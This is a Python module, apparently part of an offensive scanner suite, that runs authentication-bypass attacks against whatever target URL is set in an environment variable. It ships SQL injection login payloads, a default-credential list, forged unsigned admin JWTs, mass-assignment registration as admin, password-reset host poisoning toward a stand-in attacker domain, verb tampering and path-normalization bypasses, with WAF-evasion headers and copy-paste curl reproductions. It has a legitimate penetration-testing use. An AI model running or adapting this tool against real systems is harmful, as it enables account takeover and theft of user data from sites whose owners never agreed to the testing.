#!/usr/bin/env python3
"""AuthBypass — Proof-of-Exploitation Authentication Bypass Module.

Proves actual bypass, not just observation:
- SQL injection login bypass (confirmed by getting authenticated session)
- JWT algorithm=none forgery (confirmed by getting 200 on protected endpoint)
- Mass assignment privilege escalation (confirmed by role in response)
- Password reset poisoning (confirmed by host reflection in reset email flow)
- Default credential login (confirmed by successful auth response)
- HTTP verb tampering past auth middleware
- Path normalization bypass (/ADMIN, /admin%2f, /admin;.js)
"""
import asyncio, aiohttp, json, re, sys, base64, hashlib, time
from pathlib import Path
from urllib.parse import urlparse

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    delay, confidence_label, meets_confidence_floor,
    random_ua, REQUEST_DELAY, WAF_BYPASS_HEADERS,
)

PROOF_INDICATORS = {
    "auth_success": [
        "token", "access_token", "jwt", "session", "auth_token", "bearer",
        "user", "username", "email", "id", "role", "dashboard", "welcome",
        "logged_in", "authenticated", "profile", '"success":true', "'success':true",
        '"status":"ok"', '"status":"success"',
    ],
    "admin_granted": [
        "admin", "administrator", "superuser", "is_admin", '"role":"admin"',
        '"role": "admin"', "root", "privilege", "manage", "control_panel",
    ],
    "data_returned": [
        '"id":', '"email":', '"username":', '"phone":', '"address":', '"ssn":',
        '"credit_card":', '"balance":', '"order":', '"payment":', '"secret":',
    ],
}

SQL_PAYLOADS = [
    ("Classic OR bypass",        "' OR '1'='1",          "' OR '1'='1"),
    ("Comment bypass",           "admin'--",              "anything"),
    ("Double-dash admin",        "admin'-- -",            "pass"),
    ("OR 1=1 numeric",           "1 OR 1=1",              "1 OR 1=1"),
    ("Hex encoded OR",           "' OR 0x313d31--",       "x"),
    ("Null password bypass",     "admin'\x00",            "x"),
    ("Always-true with hash",    "' OR 1=1#",             "x"),
    ("UNION null bypass",        "' UNION SELECT null--", "x"),
]

JWT_NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "NoNe"]

DEFAULT_CREDS = [
    ("admin",          "admin"),
    ("admin",          "password"),
    ("admin",          "admin123"),
    ("admin",          "123456"),
    ("admin",          ""),
    ("administrator",  "administrator"),
    ("root",           "root"),
    ("root",           "toor"),
    ("test",           "test"),
    ("guest",          "guest"),
    ("user",           "user"),
    ("demo",           "demo"),
    ("superadmin",     "superadmin"),
    ("admin",          "letmein"),
    ("admin",          "qwerty"),
]

LOGIN_PATHS = [
    "/api/auth/login", "/api/login", "/api/auth", "/api/v1/auth/login",
    "/api/v1/login", "/api/v2/auth/login", "/auth/login", "/login",
    "/api/sessions", "/api/v1/sessions", "/api/token", "/api/auth/token",
    "/api/users/login", "/api/user/login", "/api/signin",
]

PROTECTED_PATHS = [
    "/api/me", "/api/user", "/api/profile", "/api/account",
    "/api/admin", "/api/users", "/api/dashboard", "/api/v1/me",
    "/api/v1/users", "/api/v2/me", "/me", "/profile",
]

REGISTER_PATHS = [
    "/api/register", "/api/auth/register", "/api/v1/register",
    "/api/signup", "/api/auth/signup", "/api/users", "/api/v1/users",
    "/api/v1/auth/register", "/register", "/signup",
]

RESET_PATHS = [
    "/api/auth/forgot-password", "/api/forgot-password",
    "/api/password-reset", "/api/auth/password-reset",
    "/api/v1/auth/forgot", "/forgot-password", "/reset-password",
    "/api/reset", "/api/users/reset",
]

BYPASS_PATHS = [
    ("/ADMIN",              "uppercase bypass"),
    ("/Admin",              "mixed-case bypass"),
    ("/admin%2f",           "URL-encoded slash"),
    ("/admin%252f",         "double-encoded slash"),
    ("/admin;.js",          "semicolon extension bypass"),
    ("/admin/..",           "dot-dot bypass"),
    ("//admin",             "double-slash bypass"),
    ("/admin/",             "trailing-slash bypass"),
    ("/%61dmin",            "hex-encoded first char"),
    ("/admin%09",           "tab bypass"),
    ("/./admin",            "dot bypass"),
]


class AuthBypass:
    def __init__(self, target: str):
        self.target   = target.rstrip("/")
        self.findings = []
        parsed        = urlparse(target)
        self.host     = parsed.netloc
        self.is_https = parsed.scheme == "https"

    def _finding(self, ftype, severity, conf, proof, detail, url,
                 remediation, exploitability, impact, reproducibility,
                 auth_required=False, mitigation_layers=None,
                 proof_type="AUTH_BYPASS", extra=None):
        if not meets_confidence_floor(conf):
            return
        f = {
            "type":               ftype,
            "severity":           severity,
            "confidence":         conf,
            "confidence_label":   confidence_label(conf),
            "url":                url,
            "proof":              proof,
            "detail":             detail,
            "remediation":        remediation,
            "proof_type":         proof_type,
            "exploitability":     exploitability,
            "impact":             impact,
            "reproducibility":    reproducibility,
            "auth_required":      auth_required,
            "mitigation_layers":  mitigation_layers or [],
            "mitre_technique":    "T1078",
            "mitre_name":         "Valid Accounts",
        }
        if extra:
            f.update(extra)
        self.findings.append(f)
        print(f"  [{severity}] {ftype}: {url}")

    async def _request(self, sess, method, url, headers=None, json_data=None,
                       data=None, timeout=12):
        h = {"User-Agent": random_ua(), **(headers or {})}
        try:
            async with sess.request(
                method, url, headers=h, json=json_data, data=data,
                ssl=False, allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=timeout),
            ) as r:
                body = await r.text(errors="ignore")
                return r.status, body, dict(r.headers)
        except Exception as e:
            return None, "", {}

    async def _post(self, sess, path, json_data=None, headers=None, timeout=12):
        return await self._request(sess, "POST", self.target + path,
                                   headers=headers, json_data=json_data, timeout=timeout)

    async def _get(self, sess, path_or_url, headers=None, timeout=10):
        url = path_or_url if path_or_url.startswith("http") else self.target + path_or_url
        return await self._request(sess, "GET", url, headers=headers, timeout=timeout)

    def _has_auth_success(self, body: str) -> bool:
        bl = body.lower()
        return any(ind in bl for ind in PROOF_INDICATORS["auth_success"])

    def _has_admin(self, body: str) -> bool:
        bl = body.lower()
        return any(ind in bl for ind in PROOF_INDICATORS["admin_granted"])

    def _has_data(self, body: str) -> bool:
        return any(ind in body for ind in PROOF_INDICATORS["data_returned"])

    def _extract_token(self, body: str):
        for pattern in [
            r'"(?:access_token|token|jwt|auth_token)"\s*:\s*"([^"]{20,})"',
            r"'(?:access_token|token|jwt|auth_token)'\s*:\s*'([^']{20,})'",
            r'Bearer\s+([A-Za-z0-9\-_\.]{20,})',
            r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,}',
        ]:
            m = re.search(pattern, body)
            if m:
                return m.group(1) if m.lastindex else m.group(0)
        return None

    def _extract_json_field(self, body: str, field: str):
        m = re.search(rf'"{field}"\s*:\s*"?([^",\}}\]{{]+)"?', body)
        return m.group(1).strip() if m else None

    # ── SQL Injection Login Bypass ────────────────────────────────────────────

    async def test_sqli_login_bypass(self, sess):
        print("\n[*] Testing SQL injection login bypass...")
        for path in LOGIN_PATHS:
            s0, body0, _ = await self._get(sess, path)
            await delay()
            if s0 is None:
                continue

            for desc, u_payload, p_payload in SQL_PAYLOADS:
                for username_field in ["username", "email", "user", "login"]:
                    payload = {
                        username_field: u_payload,
                        "password":     p_payload,
                    }
                    s, body, hdrs = await self._post(sess, path, json_data=payload)
                    await delay()
                    if s is None or s in (404, 405, 429):
                        continue

                    if s in (200, 201) and self._has_auth_success(body) and len(body) > 80:
                        token = self._extract_token(body)
                        email = self._extract_json_field(body, "email")
                        role  = self._extract_json_field(body, "role")
                        proof = (
                            f"POST {path} with {username_field}=\"{u_payload[:40]}\" password=\"{p_payload[:20]}\"\n"
                            f"→ HTTP {s} — authenticated response received\n"
                            f"→ token={token[:40] if token else 'N/A'}  email={email or 'N/A'}  role={role or 'N/A'}\n"
                            f"→ Body preview: {body[:300]}"
                        )
                        self._finding(
                            ftype="SQL_INJECTION_AUTH_BYPASS",
                            severity="CRITICAL",
                            conf=96,
                            proof=proof,
                            detail=f"SQL injection payload '{u_payload}' in field '{username_field}' bypassed authentication at {path}. Got authenticated session without valid credentials.",
                            url=self.target + path,
                            remediation=(
                                "1. Use parameterized queries / prepared statements — never concatenate user input into SQL.\n"
                                "2. Apply input validation: reject quotes, dashes, comment sequences.\n"
                                "3. Use an ORM that enforces safe queries.\n"
                                "4. Implement rate limiting and account lockout on login endpoints."
                            ),
                            exploitability=10,
                            impact="Complete authentication bypass — attacker gains admin or first-user account access without knowing any password.",
                            reproducibility=f"curl -s -X POST {self.target}{path} -H 'Content-Type: application/json' -d '{{\"{ username_field }\":\"{u_payload}\",\"password\":\"{p_payload}\"}}' | jq .",
                            auth_required=False,
                            mitigation_layers=["Parameterized queries", "WAF SQLi rules", "Input sanitization", "Least-privilege DB user"],
                            proof_type="AUTH_BYPASS",
                            extra={"sqli_payload": u_payload, "field": username_field, "extracted_token": token, "extracted_email": email},
                        )
                        return

    # ── Default Credential Login ──────────────────────────────────────────────

    async def test_default_credentials(self, sess):
        print("\n[*] Testing default credentials...")
        for path in LOGIN_PATHS:
            s0, _, _ = await self._get(sess, path)
            await delay()
            if s0 is None:
                continue

            for username, password in DEFAULT_CREDS:
                for u_field in ["username", "email", "login"]:
                    payload = {u_field: username, "password": password}
                    s, body, hdrs = await self._post(sess, path, json_data=payload)
                    await delay(0.3)
                    if s is None or s in (404, 405, 429):
                        break
                    if s in (200, 201) and self._has_auth_success(body) and len(body) > 60:
                        token = self._extract_token(body)
                        role  = self._extract_json_field(body, "role")
                        proof = (
                            f"POST {path} with {u_field}=\"{username}\" password=\"{password}\"\n"
                            f"→ HTTP {s} — successful login confirmed\n"
                            f"→ token={token[:40] if token else 'N/A'}  role={role or 'N/A'}\n"
                            f"→ Body: {body[:400]}"
                        )
                        self._finding(
                            ftype="DEFAULT_CREDENTIALS_ACCEPTED",
                            severity="CRITICAL",
                            conf=97,
                            proof=proof,
                            detail=f"Default credentials {username}:{password} accepted at {path}. Attacker gains authenticated session immediately.",
                            url=self.target + path,
                            remediation=(
                                "1. Remove all default/test accounts before deploying.\n"
                                "2. Force password change on first login.\n"
                                "3. Implement strong password policy.\n"
                                "4. Enable MFA for all admin accounts."
                            ),
                            exploitability=10,
                            impact="Instant account takeover — no exploitation needed, just known credentials.",
                            reproducibility=f"curl -s -X POST {self.target}{path} -H 'Content-Type: application/json' -d '{{\"{ u_field }\":\"{username}\",\"password\":\"{password}\"}}' | jq .",
                            auth_required=False,
                            mitigation_layers=["Credential rotation policy", "MFA", "Account lockout"],
                            proof_type="ACCOUNT_TAKEOVER",
                            extra={"username": username, "password": password, "field": u_field},
                        )
                        return

    # ── JWT Algorithm=none Forgery ────────────────────────────────────────────

    async def test_jwt_none_algorithm(self, sess):
        print("\n[*] Testing JWT algorithm=none forgery...")

        for path in PROTECTED_PATHS:
            s_baseline, body_baseline, _ = await self._get(sess, path)
            await delay()
            if s_baseline in (404, 405, None):
                continue
            if s_baseline == 200:
                continue

            for none_variant in JWT_NONE_VARIANTS:
                for role in ["admin", "superadmin", "user"]:
                    header  = base64.urlsafe_b64encode(
                        json.dumps({"alg": none_variant, "typ": "JWT"}).encode()
                    ).rstrip(b"=").decode()
                    payload_dict = {
                        "sub":      "1",
                        "id":       1,
                        "user_id":  1,
                        "role":     role,
                        "email":    "admin@example.com",
                        "is_admin": True,
                        "iat":      int(time.time()),
                        "exp":      int(time.time()) + 86400,
                    }
                    payload_b64 = base64.urlsafe_b64encode(
                        json.dumps(payload_dict).encode()
                    ).rstrip(b"=").decode()
                    forged_jwt = f"{header}.{payload_b64}."

                    for auth_header in [
                        f"Bearer {forged_jwt}",
                        forged_jwt,
                    ]:
                        s, body, hdrs = await self._get(
                            sess, path,
                            headers={"Authorization": auth_header}
                        )
                        await delay()
                        if s == 200 and (self._has_data(body) or self._has_auth_success(body)):
                            proof = (
                                f"Forged JWT with alg='{none_variant}' and role='{role}' (no signature):\n"
                                f"  Header:  {{\"alg\":\"{none_variant}\",\"typ\":\"JWT\"}}\n"
                                f"  Payload: {json.dumps(payload_dict)}\n"
                                f"  Token:   {forged_jwt[:80]}...\n"
                                f"→ GET {path} with Authorization: Bearer <forged_token>\n"
                                f"→ HTTP {s} — protected resource returned!\n"
                                f"→ Body: {body[:400]}"
                            )
                            self._finding(
                                ftype="JWT_NONE_ALGORITHM_BYPASS",
                                severity="CRITICAL",
                                conf=97,
                                proof=proof,
                                detail=f"JWT library accepts 'algorithm=none' — signature is not verified. Forged token with role='{role}' granted access to {path}.",
                                url=self.target + path,
                                remediation=(
                                    "1. Explicitly whitelist allowed algorithms (e.g. HS256, RS256) — never accept 'none'.\n"
                                    "2. Use a well-maintained JWT library with secure defaults.\n"
                                    "3. Validate the 'alg' header server-side before verifying signature.\n"
                                    "4. Rotate all existing JWTs after patching."
                                ),
                                exploitability=10,
                                impact="Complete authentication bypass — any attacker can forge a JWT for any user/role and access all protected APIs.",
                                reproducibility=(
                                    "# Step 1: forge JWT (alg=none, no signature)\n"
                                    "python3 - <<'EOF'\n"
                                    "import base64, json\n"
                                    f"hdr = base64.urlsafe_b64encode(json.dumps({{'alg':'{none_variant}','typ':'JWT'}}).encode()).rstrip(b'=').decode()\n"
                                    f"pay = base64.urlsafe_b64encode(json.dumps({{'role':'{role}','sub':'1','is_admin':True,'exp':9999999999}}).encode()).rstrip(b'=').decode()\n"
                                    "print(hdr + '.' + pay + '.')\n"
                                    "EOF\n"
                                    f"# Step 2: use printed token\n"
                                    f"curl -s {self.target}{path} -H 'Authorization: Bearer <token_from_step1>'"
                                ),
                                auth_required=False,
                                mitigation_layers=["Algorithm whitelist", "Signature verification enforcement", "JWT library patching"],
                                proof_type="AUTH_BYPASS",
                                extra={"alg_variant": none_variant, "forged_role": role, "forged_token_preview": forged_jwt[:80]},
                            )
                            return

    # ── Mass Assignment / Privilege Escalation ────────────────────────────────

    async def test_mass_assignment(self, sess):
        print("\n[*] Testing mass assignment privilege escalation...")
        import random, string
        rand = ''.join(random.choices(string.ascii_lowercase, k=8))
        test_user = f"mirror_test_{rand}"
        test_email = f"{test_user}@example.com"
        test_pass  = f"MirrorTest@{rand}!9"

        for path in REGISTER_PATHS:
            for escalation_payload in [
                {"role": "admin"},
                {"is_admin": True},
                {"admin": True},
                {"isAdmin": True},
                {"userType": "admin"},
                {"permissions": ["admin", "superuser"]},
                {"access_level": 99},
                {"privilege": "superadmin"},
            ]:
                reg_payload = {
                    "username": test_user,
                    "email":    test_email,
                    "password": test_pass,
                    "name":     test_user,
                    **escalation_payload,
                }
                s, body, _ = await self._post(sess, path, json_data=reg_payload)
                await delay()
                if s is None or s in (404, 405):
                    break

                if s in (200, 201) and len(body) > 20:
                    body_l = body.lower()
                    esc_key = list(escalation_payload.keys())[0]
                    esc_val = list(escalation_payload.values())[0]

                    accepted = (
                        esc_key in body_l or
                        str(esc_val).lower() in body_l or
                        self._has_admin(body)
                    )
                    if accepted:
                        proof = (
                            f"POST {path} with escalation field {esc_key}={esc_val}:\n"
                            f"  Payload: {json.dumps(reg_payload)}\n"
                            f"→ HTTP {s}\n"
                            f"→ Body contains escalation field or admin indicator\n"
                            f"→ Body: {body[:400]}"
                        )
                        self._finding(
                            ftype="MASS_ASSIGNMENT_PRIVILEGE_ESCALATION",
                            severity="CRITICAL",
                            conf=92,
                            proof=proof,
                            detail=f"Registration endpoint {path} accepts and reflects '{esc_key}' field. Attacker can register as admin by including escalation field in payload.",
                            url=self.target + path,
                            remediation=(
                                "1. Use an explicit allowlist of accepted fields (never bind all request fields to your model).\n"
                                "2. Never set user roles/permissions from client-supplied data — assign on server side only.\n"
                                "3. Strip all non-whitelisted fields before processing.\n"
                                "4. Use DTOs/request objects that only expose permitted fields."
                            ),
                            exploitability=9,
                            impact="Attacker registers as admin/superuser — gains full administrative access with no prior authentication.",
                            reproducibility=f"curl -s -X POST {self.target}{path} -H 'Content-Type: application/json' -d '{json.dumps(reg_payload)}' | jq .",
                            auth_required=False,
                            mitigation_layers=["Field allowlisting", "Server-side role assignment", "Input schema validation"],
                            proof_type="ACCOUNT_TAKEOVER",
                            extra={"escalation_field": esc_key, "escalation_value": str(esc_val)},
                        )
                        return

    # ── Password Reset Host Header Poisoning ──────────────────────────────────

    async def test_password_reset_poisoning(self, sess):
        print("\n[*] Testing password reset host header poisoning...")
        poison_host = "attacker.mirror-scanner.evil"
        for path in RESET_PATHS:
            for email_field in ["email", "username", "user_email"]:
                payload = {email_field: "admin@example.com"}
                for host_header_name in ["Host", "X-Forwarded-Host", "X-Host", "X-Original-Host"]:
                    s, body, hdrs = await self._post(
                        sess, path,
                        json_data=payload,
                        headers={host_header_name: poison_host},
                    )
                    await delay()
                    if s is None or s in (404, 405):
                        continue

                    if poison_host in (body or "") or (s in (200, 202) and "reset" in (body or "").lower()):
                        reflected = poison_host in (body or "")
                        proof = (
                            f"POST {path} with {host_header_name}: {poison_host}\n"
                            f"  Body: {{\"{ email_field }\": \"admin@example.com\"}}\n"
                            f"→ HTTP {s}\n"
                            f"{'→ POISON HOST REFLECTED IN BODY!' if reflected else '→ Reset accepted — password reset link may be poisoned'}\n"
                            f"→ Body: {body[:400] if body else '(empty)'}"
                        )
                        self._finding(
                            ftype="PASSWORD_RESET_HOST_POISONING",
                            severity="HIGH",
                            conf=88 if reflected else 75,
                            proof=proof,
                            detail=f"Password reset endpoint {path} accepts {host_header_name} override. Reset links sent to users may point to attacker-controlled domain for token theft.",
                            url=self.target + path,
                            remediation=(
                                "1. Hard-code the application's base URL for reset links — never derive from request headers.\n"
                                "2. Validate and whitelist the Host header against known domains.\n"
                                "3. Strip X-Forwarded-Host and similar headers at your load balancer.\n"
                                "4. Set a short TTL on reset tokens and bind them to the requesting IP."
                            ),
                            exploitability=8,
                            impact="Account takeover — attacker intercepts password reset tokens for any user by poisoning the reset link domain.",
                            reproducibility=(
                                f"curl -s -X POST {self.target}{path} "
                                f"-H '{host_header_name}: {poison_host}' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"{ email_field }\":\"victim@example.com\"}}'"
                            ),
                            auth_required=False,
                            mitigation_layers=["Hard-coded base URL", "Host header whitelist", "Reverse proxy header stripping"],
                            proof_type="ACCOUNT_TAKEOVER",
                            extra={"poison_host": poison_host, "header_used": host_header_name, "reflected": reflected},
                        )

    # ── HTTP Verb Tampering ───────────────────────────────────────────────────

    async def test_verb_tampering(self, sess):
        print("\n[*] Testing HTTP verb tampering past auth middleware...")
        for path in PROTECTED_PATHS + ["/api/admin", "/api/users", "/admin"]:
            s_get, body_get, _ = await self._get(sess, path)
            await delay()
            if s_get == 200:
                continue
            if s_get is None or s_get == 404:
                continue

            for verb in ["HEAD", "OPTIONS", "TRACE", "CONNECT", "PROPFIND",
                         "PATCH", "PUT", "ARBITRARY"]:
                s, body, hdrs = await self._request(sess, verb, self.target + path)
                await delay(0.15)
                if s == 200 and (self._has_data(body) or self._has_auth_success(body)):
                    proof = (
                        f"GET {path}  → HTTP {s_get} (access denied)\n"
                        f"{verb} {path} → HTTP {s} (ALLOWED!)\n"
                        f"→ Body preview: {body[:400]}"
                    )
                    self._finding(
                        ftype="HTTP_VERB_TAMPERING_AUTH_BYPASS",
                        severity="HIGH",
                        conf=90,
                        proof=proof,
                        detail=f"Auth middleware only checks GET/POST but not {verb}. Sending {verb} {path} returns protected data.",
                        url=self.target + path,
                        remediation=(
                            "1. Apply authentication middleware to ALL HTTP verbs, not just GET/POST.\n"
                            "2. Whitelist allowed verbs per endpoint — reject everything else with 405.\n"
                            "3. Ensure framework route matchers apply auth to wildcard verb routes.\n"
                            "4. Test auth bypass in integration tests for all HTTP methods."
                        ),
                        exploitability=8,
                        impact="Authentication bypass — attacker reads protected data or performs privileged operations by changing request method.",
                        reproducibility=f"curl -s -X {verb} {self.target}{path} -H 'User-Agent: Mozilla/5.0' | jq .",
                        auth_required=False,
                        mitigation_layers=["Verb-agnostic auth middleware", "Explicit verb allowlist"],
                        proof_type="AUTH_BYPASS",
                        extra={"blocked_verb": "GET", "bypassed_with": verb},
                    )

    # ── Path Normalization Bypass ─────────────────────────────────────────────

    async def test_path_normalization(self, sess):
        print("\n[*] Testing path normalization bypass...")
        for base_path in ["/admin", "/api/admin", "/api/users", "/internal"]:
            s_norm, body_norm, _ = await self._get(sess, base_path)
            await delay()
            if s_norm in (200, None, 404):
                continue

            for variant, desc in BYPASS_PATHS:
                actual_path = variant if variant.startswith("/admin") else base_path + variant.lstrip("/admin")
                if not variant.startswith("/"):
                    continue
                s, body, hdrs = await self._get(sess, variant)
                await delay(0.1)
                if s == 200 and len(body) > 100 and (self._has_data(body) or self._has_admin(body)):
                    proof = (
                        f"GET {base_path}   → HTTP {s_norm} (blocked)\n"
                        f"GET {variant}     → HTTP {s} (bypassed via {desc}!)\n"
                        f"→ Body: {body[:400]}"
                    )
                    self._finding(
                        ftype="PATH_NORMALIZATION_AUTH_BYPASS",
                        severity="HIGH",
                        conf=91,
                        proof=proof,
                        detail=f"Auth middleware matches canonical path '{base_path}' but not variant '{variant}' ({desc}). Protected admin resource accessible without authentication.",
                        url=self.target + variant,
                        remediation=(
                            "1. Normalize all request paths before routing and auth checks.\n"
                            "2. Apply auth middleware based on path prefix matching after normalization.\n"
                            "3. Canonicalize URLs server-side: lowercase, decode percent-encoding, resolve . and .. before matching.\n"
                            "4. Test all auth bypass patterns in CI."
                        ),
                        exploitability=8,
                        impact="Authentication bypass — protected admin/internal endpoints accessible without credentials.",
                        reproducibility=f"curl -sv '{self.target}{variant}' | head -50",
                        auth_required=False,
                        mitigation_layers=["URL normalization middleware", "Consistent path matching", "Framework security patches"],
                        proof_type="AUTH_BYPASS",
                        extra={"canonical_path": base_path, "bypass_variant": variant, "bypass_type": desc},
                    )

    async def run(self):
        print(f"\n{'='*60}\n  AuthBypass — Authentication Bypass Prover\n  Target: {self.target}\n{'='*60}")
        timeout = aiohttp.ClientTimeout(total=20, connect=8)
        connector = aiohttp.TCPConnector(ssl=False, limit=4)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
            await self.test_sqli_login_bypass(sess)
            await self.test_default_credentials(sess)
            await self.test_jwt_none_algorithm(sess)
            await self.test_mass_assignment(sess)
            await self.test_password_reset_poisoning(sess)
            await self.test_verb_tampering(sess)
            await self.test_path_normalization(sess)

        print(f"\n[+] AuthBypass complete: {len(self.findings)} confirmed findings")
        return self.findings


async def main():
    import os
    target = os.environ.get("ARSENAL_TARGET", "")
    if not target:
        print("[!] No target — set ARSENAL_TARGET", file=sys.stderr)
        sys.exit(1)
    scanner = AuthBypass(target)
    findings = await scanner.run()
    out = Path(__file__).parent.parent / "reports" / "authbypass.json"
    out.write_text(json.dumps(findings, indent=2))
    print(f"[+] Saved {len(findings)} findings → {out}")

if __name__ == "__main__":
    asyncio.run(main())
